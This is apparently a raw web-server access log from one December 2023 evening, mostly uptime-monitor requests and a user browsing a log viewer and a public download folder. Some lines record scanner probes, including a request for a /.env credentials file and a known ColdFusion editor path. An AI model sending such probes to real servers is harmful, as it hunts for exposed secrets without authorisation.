159.203.109.206 - - [20/Dec/2023:21:06:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2938 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:21:06:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2939 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:21:07:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2940 "www@docker" "http://172.20.0.9:80" 1ms
143.110.222.166 - - [20/Dec/2023:21:07:26 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2941 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [20/Dec/2023:21:07:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2942 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:21:08:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2943 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:21:08:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2944 "www@docker" "http://172.20.0.9:80" 0ms
104.243.37.151 - - [20/Dec/2023:21:09:17 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2945 "-" "-" 0ms
104.243.37.151 - - [20/Dec/2023:21:09:17 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2946 "-" "-" 0ms
104.243.37.151 - - [20/Dec/2023:21:09:17 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2947 "-" "-" 0ms
104.243.37.151 - - [20/Dec/2023:21:09:17 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2948 "-" "-" 0ms
104.243.37.151 - - [20/Dec/2023:21:09:17 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2949 "-" "-" 0ms
104.243.37.151 - - [20/Dec/2023:21:09:17 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2950 "-" "-" 0ms
104.243.37.151 - - [20/Dec/2023:21:09:17 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2951 "-" "-" 0ms
104.243.37.151 - - [20/Dec/2023:21:09:17 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2952 "-" "-" 0ms
104.243.37.151 - - [20/Dec/2023:21:09:17 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2953 "-" "-" 0ms
104.243.37.151 - - [20/Dec/2023:21:09:17 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2954 "-" "-" 0ms
104.243.37.151 - - [20/Dec/2023:21:09:17 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2955 "-" "-" 0ms
104.243.37.151 - - [20/Dec/2023:21:09:17 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2956 "-" "-" 0ms
104.243.37.151 - - [20/Dec/2023:21:09:17 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2957 "-" "-" 0ms
104.243.37.151 - - [20/Dec/2023:21:09:17 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2958 "-" "-" 0ms
104.243.37.151 - - [20/Dec/2023:21:09:17 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2959 "-" "-" 0ms
104.243.37.151 - - [20/Dec/2023:21:09:17 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2960 "-" "-" 0ms
104.243.37.151 - - [20/Dec/2023:21:09:17 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2961 "-" "-" 0ms
104.243.37.151 - - [20/Dec/2023:21:09:17 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2962 "-" "-" 0ms
104.243.37.151 - - [20/Dec/2023:21:09:17 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2963 "-" "-" 0ms
104.243.37.151 - - [20/Dec/2023:21:09:17 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2964 "-" "-" 0ms
104.243.37.151 - - [20/Dec/2023:21:09:17 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2965 "-" "-" 0ms
104.243.37.151 - - [20/Dec/2023:21:09:17 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2966 "-" "-" 0ms
104.243.37.151 - - [20/Dec/2023:21:09:17 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2967 "-" "-" 0ms
104.243.37.151 - - [20/Dec/2023:21:09:17 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2968 "-" "-" 0ms
104.243.37.151 - - [20/Dec/2023:21:09:17 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2969 "-" "-" 0ms
104.243.37.151 - - [20/Dec/2023:21:09:17 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2970 "-" "-" 0ms
104.243.37.151 - - [20/Dec/2023:21:09:17 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2971 "-" "-" 0ms
104.243.37.151 - - [20/Dec/2023:21:09:17 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2972 "-" "-" 0ms
104.243.37.151 - - [20/Dec/2023:21:09:17 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2973 "-" "-" 0ms
104.243.37.151 - - [20/Dec/2023:21:09:17 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2974 "-" "-" 0ms
104.243.37.151 - - [20/Dec/2023:21:09:17 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2975 "-" "-" 0ms
104.243.37.151 - - [20/Dec/2023:21:09:17 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2976 "-" "-" 0ms
104.243.37.151 - - [20/Dec/2023:21:09:17 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2977 "-" "-" 0ms
104.243.37.151 - - [20/Dec/2023:21:09:17 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2978 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:21:09:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2979 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:21:09:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2980 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:21:10:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2981 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:21:10:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2982 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:21:11:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2983 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:21:11:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2984 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:21:12:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2985 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:21:12:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2986 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:21:13:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2987 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:21:13:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2988 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:21:14:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2989 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:21:14:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2990 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:21:15:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2991 "www@docker" "http://172.20.0.9:80" 0ms
69.164.217.74 - - [20/Dec/2023:21:15:27 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2992 "-" "-" 0ms
167.71.120.76 - - [20/Dec/2023:21:15:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2993 "www@docker" "http://172.20.0.9:80" 0ms
172.105.128.13 - - [20/Dec/2023:21:15:44 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2994 "-" "-" 0ms
45.79.163.53 - - [20/Dec/2023:21:15:50 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2995 "-" "-" 0ms
45.79.128.205 - - [20/Dec/2023:21:16:11 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2996 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:21:16:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2997 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:21:16:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2998 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:21:17:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2999 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:21:17:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3000 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:21:18:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3001 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:21:18:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3002 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:21:19:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3003 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:21:19:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3004 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:21:20:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3005 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:21:20:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3006 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:21:21:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3007 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:21:21:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3008 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:21:22:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3009 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:21:22:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3010 "www@docker" "http://172.20.0.9:80" 0ms
170.106.115.15 - - [20/Dec/2023:21:22:39 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3011 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:21:23:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3012 "www@docker" "http://172.20.0.9:80" 1ms
36.99.136.128 - - [20/Dec/2023:21:23:22 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3013 "-" "-" 0ms
146.70.178.94 - - [20/Dec/2023:21:23:32 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3014 "-" "-" 0ms
167.71.120.76 - - [20/Dec/2023:21:23:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3015 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:21:24:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3016 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:21:24:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3017 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:21:25:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3018 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:21:25:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3019 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:21:26:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3020 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:21:26:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3021 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:21:27:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3022 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:21:27:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3023 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:21:28:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3024 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:21:28:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3025 "www@docker" "http://172.20.0.9:80" 0ms
129.55.200.20 - - [20/Dec/2023:21:28:35 +0000] "GET /logs/ HTTP/2.0" 304 0 "-" "-" 3026 "logpager@docker" "http://172.20.0.3:80" 1ms
129.55.200.20 - - [20/Dec/2023:21:28:35 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 1942 "-" "-" 3027 "logpager@docker" "http://172.20.0.3:80" 3ms
129.55.200.20 - - [20/Dec/2023:21:28:40 +0000] "GET /logs/logtail.php?page=1 HTTP/2.0" 200 1942 "-" "-" 3028 "logpager@docker" "http://172.20.0.3:80" 5ms
129.55.200.20 - - [20/Dec/2023:21:28:42 +0000] "GET /logs/logtail.php?page=2 HTTP/2.0" 200 1937 "-" "-" 3029 "logpager@docker" "http://172.20.0.3:80" 7ms
129.55.200.20 - - [20/Dec/2023:21:28:44 +0000] "GET /logs/logtail.php?page=3 HTTP/2.0" 200 1933 "-" "-" 3030 "logpager@docker" "http://172.20.0.3:80" 13ms
129.55.200.20 - - [20/Dec/2023:21:28:44 +0000] "GET /logs/logtail.php?page=4 HTTP/2.0" 200 1929 "-" "-" 3031 "logpager@docker" "http://172.20.0.3:80" 15ms
129.55.200.20 - - [20/Dec/2023:21:28:45 +0000] "GET /logs/logtail.php?page=5 HTTP/2.0" 200 1938 "-" "-" 3032 "logpager@docker" "http://172.20.0.3:80" 20ms
129.55.200.20 - - [20/Dec/2023:21:28:45 +0000] "GET /logs/logtail.php?page=6 HTTP/2.0" 200 2397 "-" "-" 3033 "logpager@docker" "http://172.20.0.3:80" 24ms
129.55.200.20 - - [20/Dec/2023:21:28:47 +0000] "GET /logs/logtail.php?page=5 HTTP/2.0" 200 1936 "-" "-" 3034 "logpager@docker" "http://172.20.0.3:80" 18ms
129.55.200.20 - - [20/Dec/2023:21:28:48 +0000] "GET /logs/logtail.php?page=4 HTTP/2.0" 200 1929 "-" "-" 3035 "logpager@docker" "http://172.20.0.3:80" 14ms
129.55.200.20 - - [20/Dec/2023:21:28:49 +0000] "GET /logs/logtail.php?page=3 HTTP/2.0" 200 1939 "-" "-" 3036 "logpager@docker" "http://172.20.0.3:80" 12ms
129.55.200.20 - - [20/Dec/2023:21:28:50 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2176 "-" "-" 3037 "logpager@docker" "http://172.20.0.3:80" 4ms
129.55.200.20 - - [20/Dec/2023:21:28:54 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2200 "-" "-" 3038 "logpager@docker" "http://172.20.0.3:80" 4ms
129.55.200.20 - - [20/Dec/2023:21:29:04 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2222 "-" "-" 3039 "logpager@docker" "http://172.20.0.3:80" 8ms
129.55.200.20 - - [20/Dec/2023:21:29:14 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2246 "-" "-" 3040 "logpager@docker" "http://172.20.0.3:80" 4ms
143.110.222.166 - - [20/Dec/2023:21:29:15 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 3041 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:21:29:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3042 "www@docker" "http://172.20.0.9:80" 0ms
129.55.200.20 - - [20/Dec/2023:21:29:24 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2268 "-" "-" 3043 "logpager@docker" "http://172.20.0.3:80" 3ms
167.71.120.76 - - [20/Dec/2023:21:29:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3044 "www@docker" "http://172.20.0.9:80" 0ms
129.55.200.20 - - [20/Dec/2023:21:29:34 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2244 "-" "-" 3045 "logpager@docker" "http://172.20.0.3:80" 3ms
129.55.200.20 - - [20/Dec/2023:21:29:44 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2244 "-" "-" 3046 "logpager@docker" "http://172.20.0.3:80" 4ms
129.55.200.20 - - [20/Dec/2023:21:29:54 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2244 "-" "-" 3047 "logpager@docker" "http://172.20.0.3:80" 4ms
159.203.109.206 - - [20/Dec/2023:21:30:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3048 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:21:30:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3049 "www@docker" "http://172.20.0.9:80" 0ms
129.55.200.20 - - [20/Dec/2023:21:31:02 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2198 "-" "-" 3050 "logpager@docker" "http://172.20.0.3:80" 4ms
159.203.109.206 - - [20/Dec/2023:21:31:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3051 "www@docker" "http://172.20.0.9:80" 2ms
167.71.120.76 - - [20/Dec/2023:21:31:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3052 "www@docker" "http://172.20.0.9:80" 0ms
129.55.200.20 - - [20/Dec/2023:21:32:02 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2152 "-" "-" 3053 "logpager@docker" "http://172.20.0.3:80" 3ms
159.203.109.206 - - [20/Dec/2023:21:32:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3054 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:21:32:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3055 "www@docker" "http://172.20.0.9:80" 0ms
129.55.200.20 - - [20/Dec/2023:21:33:02 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2106 "-" "-" 3056 "logpager@docker" "http://172.20.0.3:80" 4ms
45.33.87.154 - - [20/Dec/2023:21:33:17 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3057 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:21:33:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3058 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:21:33:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3059 "www@docker" "http://172.20.0.9:80" 1ms
192.155.90.220 - - [20/Dec/2023:21:33:50 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3060 "-" "-" 0ms
129.55.200.20 - - [20/Dec/2023:21:34:02 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2079 "-" "-" 3061 "logpager@docker" "http://172.20.0.3:80" 3ms
159.203.109.206 - - [20/Dec/2023:21:34:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3062 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:21:34:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3063 "www@docker" "http://172.20.0.9:80" 0ms
129.55.200.20 - - [20/Dec/2023:21:35:02 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2033 "-" "-" 3064 "logpager@docker" "http://172.20.0.3:80" 3ms
159.203.109.206 - - [20/Dec/2023:21:35:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3065 "www@docker" "http://172.20.0.9:80" 1ms
129.55.200.20 - - [20/Dec/2023:21:35:25 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2057 "-" "-" 3066 "logpager@docker" "http://172.20.0.3:80" 4ms
167.71.120.76 - - [20/Dec/2023:21:35:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3067 "www@docker" "http://172.20.0.9:80" 0ms
129.55.200.20 - - [20/Dec/2023:21:35:36 +0000] "GET /logs/ HTTP/2.0" 304 0 "-" "-" 3068 "logpager@docker" "http://172.20.0.3:80" 0ms
129.55.200.20 - - [20/Dec/2023:21:35:36 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2058 "-" "-" 3069 "logpager@docker" "http://172.20.0.3:80" 4ms
159.203.109.206 - - [20/Dec/2023:21:36:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3070 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:21:36:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3071 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:21:37:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3072 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:21:37:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3073 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:21:38:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3074 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:21:38:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3075 "www@docker" "http://172.20.0.9:80" 1ms
129.55.200.20 - - [20/Dec/2023:21:38:46 +0000] "GET /logs/ HTTP/2.0" 304 0 "-" "-" 3076 "logpager@docker" "http://172.20.0.3:80" 1ms
129.55.200.20 - - [20/Dec/2023:21:38:46 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2041 "-" "-" 3077 "logpager@docker" "http://172.20.0.3:80" 4ms
159.203.109.206 - - [20/Dec/2023:21:39:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3078 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:21:39:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3079 "www@docker" "http://172.20.0.9:80" 0ms
185.180.140.4 - - [20/Dec/2023:21:39:43 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3080 "-" "-" 0ms
185.180.140.4 - - [20/Dec/2023:21:39:53 +0000] "GET /cf_scripts/scripts/ajax/ckeditor/ckeditor.js HTTP/1.1" 404 19 "-" "-" 3081 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:21:40:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3082 "www@docker" "http://172.20.0.9:80" 0ms
129.55.200.20 - - [20/Dec/2023:21:40:22 +0000] "GET /public/ HTTP/2.0" 200 505 "-" "-" 3083 "www@docker" "http://172.20.0.9:80" 4ms
167.71.120.76 - - [20/Dec/2023:21:40:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3084 "www@docker" "http://172.20.0.9:80" 0ms
129.55.200.20 - - [20/Dec/2023:21:40:37 +0000] "GET /public/Backgrounds/ HTTP/2.0" 200 970 "-" "-" 3085 "www@docker" "http://172.20.0.9:80" 1ms
129.55.200.20 - - [20/Dec/2023:21:40:42 +0000] "GET /public/Backgrounds/Tilt-Shift.zip HTTP/2.0" 200 50858166 "-" "-" 3086 "www@docker" "http://172.20.0.9:80" 501ms
159.203.109.206 - - [20/Dec/2023:21:41:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3087 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:21:41:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3088 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:21:42:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3089 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:21:42:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3090 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:21:43:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3091 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:21:43:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3092 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:21:44:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3093 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:21:44:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3094 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:21:45:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3095 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:21:45:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3096 "www@docker" "http://172.20.0.9:80" 0ms
57.129.23.166 - - [20/Dec/2023:21:46:12 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 3097 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [20/Dec/2023:21:46:12 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 3098 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:21:46:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3099 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:21:46:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3100 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:21:47:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3101 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:21:47:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3102 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:21:48:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3103 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:21:48:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3104 "www@docker" "http://172.20.0.9:80" 0ms
172.104.210.105 - - [20/Dec/2023:21:49:16 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3105 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:21:49:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3106 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:21:49:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3107 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:21:50:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3108 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:21:50:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3109 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:21:51:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3110 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:21:51:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3111 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:21:52:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3112 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:21:52:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3113 "www@docker" "http://172.20.0.9:80" 0ms
45.79.181.223 - - [20/Dec/2023:21:52:45 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3114 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:21:53:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3115 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:21:53:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3116 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:21:54:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3117 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:21:54:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3118 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:21:55:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3119 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:21:55:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3120 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:21:56:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3121 "www@docker" "http://172.20.0.9:80" 0ms
